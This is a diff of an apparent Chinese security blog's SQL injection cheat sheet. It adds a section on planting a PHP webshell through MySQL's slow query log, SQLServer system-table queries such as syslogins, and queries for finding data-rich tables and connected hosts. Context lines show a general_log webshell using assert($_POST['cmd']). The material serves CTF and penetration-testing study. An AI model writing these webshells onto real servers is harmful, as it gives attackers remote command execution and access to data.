@@ -79,8 +79,10 @@
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/wp/axuxfcnn63.png">
 <meta property="og:image" content="http://cn-sec.com/wp-content/uploads/2020/11/2-1604278328.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220525214331732.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221214172227964.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221214172429299.png">
 <meta property="article:published_time" content="2021-02-28T05:22:32.000Z">
-<meta property="article:modified_time" content="2022-08-27T14:21:40.061Z">
+<meta property="article:modified_time" content="2022-12-14T09:24:32.446Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="sql">
@@ -341,7 +343,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">14.8k</span>Reading time: <span class="post-count reading-time">68 min</span></span>
+                        <span>Word count: <span class="post-count word-count">15.2k</span>Reading time: <span class="post-count reading-time">70 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -521,9 +523,13 @@ height:50vh;
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/xxxx/WWW/cmd.php&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <hr>
-<p>也可以通过慢查询的方法写shell，但是只有查询时间大于long_query_time才会被记录，因此可以设置long_query_time为一个很小的数值</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%slow_query_log%&#x27;</span>; <span class="comment"># 查询慢日志记录是否开启</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log=<span class="number">1</span>; <span class="comment"># 开启慢查询日志</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">&#x27;/var/www/html/helpyou2findflag.php&#x27;</span>; <span class="comment"># 设置慢查询日志位置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> long_query_time=<span class="number">0.000001</span>;<span class="comment">--+ #减小记录查询的时间</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;long_query_time&#x27;</span>;<span class="comment">--+</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php $_REQUEST[a]($_REQUEST[b])?&gt;&#x27;</span>;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h2 id="1-6-慢日志查询写shell"><a href="#1-6-慢日志查询写shell" class="headerlink" title="1.6 慢日志查询写shell"></a>1.6 慢日志查询写shell</h2><p>也可以通过慢查询的方法写shell，但是只有查询时间大于long_query_time才会被记录，因此可以设置long_query_time为一个很小的数值</p>
+<ul>
+<li>优点：在secure_file_priv为NULL时也可以使用</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%slow_query_log%&#x27;</span>; <span class="comment"># 查询慢日志记录是否开启</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log=<span class="number">1</span>; <span class="comment"># 开启慢查询日志</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%slow_query_log%&#x27;</span>; <span class="comment"># 查询慢日志记录是否开启</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">&#x27;/var/www/html/helpyou2findflag.php&#x27;</span>; <span class="comment"># 设置慢查询日志位置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> long_query_time=<span class="number">0.000001</span>; <span class="comment">#减小记录查询的时间</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;long_query_time&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php $_REQUEST[a]($_REQUEST[b])?&gt;&#x27;</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>
 
+<p>访问<code>/var/www/html/helpyou2findflag.php</code>即可</p>
 <p>例题：2021深育杯Easy SQL</p>
 <h1 id="0x02-SQLServer"><a href="#0x02-SQLServer" class="headerlink" title="0x02 SQLServer"></a>0x02 SQLServer</h1><p>SQLServer是微软出的，因此简称也叫<strong>MssqlServer</strong><br><img src="/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/3.png"><br>数据库的创建和连接==&gt;<a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/83244011">https://blog.csdn.net/dyw_666666/article/details/83244011</a></p>
 <h2 id="SQLServer基础知识"><a href="#SQLServer基础知识" class="headerlink" title="SQLServer基础知识"></a>SQLServer基础知识</h2><h3 id="判断是MSSqlServer方法"><a href="#判断是MSSqlServer方法" class="headerlink" title="判断是MSSqlServer方法"></a>判断是MSSqlServer方法</h3><ul>
@@ -685,8 +691,13 @@ height:50vh;
 </tbody></table>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库所有表的信息</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> sysobjects <span class="keyword">WHERE</span> xtpye=<span class="string">&#x27;U&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="SQLServer基础查询"><a href="#SQLServer基础查询" class="headerlink" title="SQLServer基础查询"></a>SQLServer基础查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@<span class="keyword">version</span>;       查询数据库的版本</span><br><span class="line"><span class="keyword">select</span> @@servername;    查询服务名</span><br><span class="line"><span class="keyword">select</span> host_name();     查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line"><span class="keyword">select</span> db_name();       查询当前数据库名</span><br><span class="line"><span class="keyword">select</span> db_name(<span class="number">1</span>);      查询第一个数据库名</span><br><span class="line"><span class="keyword">select</span> db_name(<span class="number">2</span>);      查询第二个数据库名</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>;            查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line"><span class="keyword">use</span> tempdb              切换到tempdb表  </span><br><span class="line">top n                   查询前n条记录</span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span>,<span class="number">3</span>               查询第<span class="number">2</span>条开始的<span class="number">3</span>条数据，也就是<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substring</span>(<span class="string">&#x27;string&#x27;</span>,<span class="number">2</span>,<span class="number">1</span>)     截取给定字符串的索引为<span class="number">2</span>的<span class="number">1</span>个字符</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">&#x27;a&#x27;</span>)                  查询给定字符串的<span class="keyword">ascii</span>值</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">len</span>(<span class="string">&#x27;string&#x27;</span>)               查询给定字符串的长度</span><br><span class="line">EXEC sp_spaceused @updateusage = N<span class="string">&#x27;TRUE&#x27;</span>;  查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                查询指定表名的大小</span><br></pre></td></tr></table></figure>
+<h2 id="SQLServer基础查询"><a href="#SQLServer基础查询" class="headerlink" title="SQLServer基础查询"></a>SQLServer基础查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@<span class="keyword">version</span>;       查询数据库的版本</span><br><span class="line"><span class="keyword">select</span> @@servername;    查询服务名</span><br><span class="line"><span class="keyword">select</span> host_name();     查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line"><span class="keyword">select</span> db_name();       查询当前数据库名</span><br><span class="line"><span class="keyword">select</span> db_name(<span class="number">1</span>);      查询第一个数据库名</span><br><span class="line"><span class="keyword">select</span> db_name(<span class="number">2</span>);      查询第二个数据库名</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>;            查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> sys.tables ;<span class="comment">--数据库表视图</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> sys.columns ; <span class="comment">--数据库表字段</span></span><br><span class="line"><span class="comment"># 查询数据库tests下的表</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> [tests]..sysobjects  <span class="keyword">WHERE</span> xtype=<span class="string">&#x27;U&#x27;</span></span><br><span class="line"><span class="keyword">use</span> tempdb              切换到tempdb表  </span><br><span class="line">top n                   查询前n条记录</span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span>,<span class="number">3</span>               查询第<span class="number">2</span>条开始的<span class="number">3</span>条数据，也就是<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substring</span>(<span class="string">&#x27;string&#x27;</span>,<span class="number">2</span>,<span class="number">1</span>)     截取给定字符串的索引为<span class="number">2</span>的<span class="number">1</span>个字符</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">&#x27;a&#x27;</span>)                  查询给定字符串的<span class="keyword">ascii</span>值</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">len</span>(<span class="string">&#x27;string&#x27;</span>)               查询给定字符串的长度</span><br><span class="line">EXEC sp_spaceused @updateusage = N<span class="string">&#x27;TRUE&#x27;</span>;  查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                查询指定表名的大小</span><br></pre></td></tr></table></figure>
 <p>可以用@@servicename=host_name()来判断是否站库分离</p>
+<p>各个系统表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">select * from sysaltfiles;--主数据库 保存数据库的文件</span><br><span class="line">select * from syscharsets;--主数据库 字符集与排序顺序</span><br><span class="line">select * from  sysconfigures;-- 主数据库 配置选项</span><br><span class="line">select * from syscurconfigs;--主数据库 当前配置选项</span><br><span class="line">select * from sysdatabases ;--主数据库 服务器中的数据库</span><br><span class="line">select * from syslanguages;--主数据库 语言 </span><br><span class="line">select * from syslogins;--主数据库 登陆帐号信息 </span><br><span class="line">select * from sysoledbusers;--主数据库 链接服务器登陆信息 </span><br><span class="line">select * from sysprocesses;--主数据库 进程 </span><br><span class="line">select * from sysremotelogins;--主数据库 远程登录帐号 </span><br><span class="line">select * from syscolumns;--每个数据库 列 </span><br><span class="line">select * from sysconstrains;--每个数据库 限制 </span><br><span class="line">select * from sysfilegroups;--每个数据库 文件组 </span><br><span class="line">select * from sysfiles;--每个数据库 文件 </span><br><span class="line">select * from sysforeignkeys;-- 每个数据库 外部关键字 </span><br><span class="line">select * from sysindexs ;--每个数据库 索引 </span><br><span class="line">select * from sysmenbers ;--每个数据库 角色成员 </span><br><span class="line">select * from sysobjects ;--每个数据库 所有数据库对象 </span><br><span class="line">select * from syspermissions;--每个数据库 权限 </span><br><span class="line">select * from systypes;-- 每个数据库 用户定义数据类型 </span><br></pre></td></tr></table></figure>
+
+
+
 <p><strong>用户权限</strong>：</p>
 <ol>
 <li><strong>sa权限</strong>：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li>
@@ -1479,6 +1490,14 @@ Select &#39;a&#39; || &#39;b&#39; from dual 结果：ab
 <p>以下几个都可以发出网络请求:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UTL_INADDR.GET_HOST_ADDRESS</span><br><span class="line">UTL_HTTP.REQUEST</span><br><span class="line">HTTP_URITYPE.GETCLOB</span><br><span class="line">DBMS_LDAP.INIT and UTL_TCP</span><br></pre></td></tr></table></figure>
 
+<h1 id="敏感信息查找"><a href="#敏感信息查找" class="headerlink" title="敏感信息查找"></a>敏感信息查找</h1><p>筛选行数多的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name,table_rows,table_schema,table_comment from  information_schema.tables order by table_rows desc;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221214172227964.png" alt="image-20221214172227964"></p>
+<p>查看连接者的ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM performance_schema.hosts;</span><br><span class="line">show full processlist;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221214172429299.png" alt="image-20221214172429299"></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
 <li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/07/5deb12bee9a98/?__cf_chl_jschl_tk__=8ae3404b75fabdde0fe82de288e5e73b283956ca-1614510870-0-AUjQIr3zdwr2q26z_fVFzk9N1q_ZkVsYoov6XPJp9BSOU5EK2s34RXQnkQUz6wFzMss2NwTPgKJmeaP2eXW_JRGK1l1ZoVEHk93fkTnH__bKOcCvxAVNlMpugEPuPFt6HMsmF2kQxBavbegTfJicX3k-IqzVA2CAUAbjKoY2Tx3nm0UKp8KICuOr22SjeK_X417FYhR44OwbVyBjYfYnj_OuFHzrzNJ8T3zwUy-emfsAB7fT89H4UBfJlQApCw2CLWb-RVdLbZnvVXXXDk9yG26tnCnXl72eOEtBdi4ASCXbDF8hSSg1ulFBAdi9K-PiMM3jE4VZ2x3b-YF0CF_3cz0">SQL注入之sqlserver注入</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/200154#h2-13">SQLServer数据库注入详解</a></li>
@@ -1637,7 +1656,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Mysql"><span class="toc-number">1.</span> <span class="toc-text">0x01 Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-root%E6%9D%83%E9%99%90"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 判断是否具有读写权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 MySQL联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E9%80%82%E7%94%A8%E4%BA%8Emysql%E4%BD%8E%E4%BA%8E5-0%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 适用于mysql低于5.0版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E9%80%82%E7%94%A8%E4%BA%8EMysql-5-0%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E6%94%AF%E6%8C%81%E6%9F%A5%E8%A1%A8%E6%9F%A5%E5%88%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 适用于Mysql 5.0以上版本支持查表查列</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 Mysql报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-Mysql%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 Mysql盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-Mysql%E4%B8%89%E6%AD%A5%E5%86%99shell"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 Mysql三步写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-SQLServer"><span class="toc-number">2.</span> <span class="toc-text">0x02 SQLServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">SQLServer基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AFMSSqlServer%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">判断是MSSqlServer方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLServer%E7%9A%84%E5%BA%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">SQLServer的库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sysobjects%E8%A1%A8"><span class="toc-number">2.2.</span> <span class="toc-text">sysobjects表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.3.</span> <span class="toc-text">SQLServer基础查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SA%E6%9D%83%E9%99%90"><span class="toc-number">2.4.</span> <span class="toc-text">SA权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.1.</span> <span class="toc-text">开启xp_cmdshell执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sp-oacreate%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.2.</span> <span class="toc-text">使用sp_oacreate执行系统命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DB-OWNER%E6%9D%83%E9%99%90"><span class="toc-number">2.5.</span> <span class="toc-text">DB_OWNER权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOG%E5%A4%87%E4%BB%BDGetshell"><span class="toc-number">2.5.1.</span> <span class="toc-text">LOG备份Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDGetShell"><span class="toc-number">2.5.2.</span> <span class="toc-text">权限差异备份GetShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-Union%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.6.</span> <span class="toc-text">SQLServer Union查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">SQLServer 延时注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.8.</span> <span class="toc-text">SQLServer 盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.9.</span> <span class="toc-text">SQLServer报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%E7%9A%84%E5%A5%87%E5%B7%A7%E6%B7%AB%E6%8A%80"><span class="toc-number">2.10.</span> <span class="toc-text">SQLServer获取权限的奇巧淫技</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Oracle"><span class="toc-number">3.</span> <span class="toc-text">0x03 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">3.1.1.</span> <span class="toc-text">连接方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E7%A9%BA%E9%97%B4"><span class="toc-number">3.1.2.</span> <span class="toc-text">表空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7"><span class="toc-number">3.1.3.</span> <span class="toc-text">用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8"><span class="toc-number">3.1.4.</span> <span class="toc-text">表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#profile%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.5.</span> <span class="toc-text">profile配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">3.2.</span> <span class="toc-text">环境安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.</span> <span class="toc-text">基础信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">3.3.1.</span> <span class="toc-text">基础语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="toc-number">3.3.2.</span> <span class="toc-text">系统表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%92%8C%E7%94%A8%E6%88%B7"><span class="toc-number">3.3.3.</span> <span class="toc-text">权限和用户</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">系统权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E6%9D%83%E9%99%90"><span class="toc-number">3.3.3.2.</span> <span class="toc-text">实体权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7-1"><span class="toc-number">3.3.3.3.</span> <span class="toc-text">用户</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">3.4.</span> <span class="toc-text">查询数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.4.1.</span> <span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.4.2.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.3.</span> <span class="toc-text">手工显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.4.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.5.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.5.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SET-OUTPUT-TO-JAVA"><span class="toc-number">3.5.1.</span> <span class="toc-text">SET_OUTPUT_TO_JAVA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-DOMAIN-INDEX-TABLES"><span class="toc-number">3.5.2.</span> <span class="toc-text">GET_DOMAIN_INDEX_TABLES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LT-FINDRICSET"><span class="toc-number">3.5.3.</span> <span class="toc-text">LT.FINDRICSET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SDO-DROP-USER-BEFORE"><span class="toc-number">3.5.4.</span> <span class="toc-text">SDO_DROP_USER_BEFORE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.6.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-DBMS-XMLQUERY"><span class="toc-number">3.6.1.</span> <span class="toc-text">1. DBMS_XMLQUERY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E5%AD%98%E5%82%A8%E8%BF%9B%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.6.2.</span> <span class="toc-text">2. 创建存储进程执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DBMS-JAVA-RUNJAVA"><span class="toc-number">3.6.3.</span> <span class="toc-text">3. DBMS_JAVA.RUNJAVA</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlite"><span class="toc-number">4.</span> <span class="toc-text">sqlite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">sql注入防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">站库分离的系统渗透方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B1Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.1.</span> <span 